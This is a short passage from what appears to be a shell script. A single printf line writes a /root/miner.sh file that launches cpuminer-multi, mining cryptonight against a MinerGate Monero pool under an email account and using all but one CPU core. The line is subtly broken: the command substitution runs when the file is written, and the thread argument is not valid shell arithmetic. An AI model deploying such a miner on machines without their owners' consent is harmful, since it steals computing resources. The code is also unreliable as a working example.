...
printf "#!/bin/bash\nn_core=`eval grep -c ^processor /proc/cpuinfo`\n/root/cpuminer-multi/cpuminer -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u im@tung.pro -p x --thread=($n_core-1)" > /root/miner.sh
